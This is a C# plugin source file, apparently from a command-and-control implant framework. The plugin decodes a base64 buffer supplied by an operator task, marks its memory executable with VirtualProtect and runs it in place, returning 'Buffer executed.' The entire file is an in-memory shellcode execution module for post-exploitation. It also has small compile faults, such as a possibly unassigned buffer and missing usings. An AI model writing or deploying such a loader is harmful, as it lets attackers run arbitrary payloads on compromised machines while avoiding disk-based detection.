using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using PluginBase;

namespace Plugin
{
    public static class inlineexec
    {
        private delegate void BufferDelegate();
        private enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect); 

        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            byte[] buffer;
            if (args.ContainsKey("buffer"))
            {
                buffer = Convert.FromBase64String(args["buffer"].ToString());
            }
            
            unsafe
            {
                fixed (byte* ptr = buffer)
                {
                    IntPtr pAddr = (IntPtr)ptr;
                    VirtualProtect(pAddr, (UIntPtr)buffer.Length, MemoryProtection.PAGE_EXECUTE_READ, out MemoryProtection lpfOldProtect);
                    BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate));
                    f();
                }
            }

            return new ResponseResult()
            {
                completed = "true",
                user_output = "Buffer executed.",
                task_id = (string)args["task-id"],
                status = "success"
            };


        }
    }
}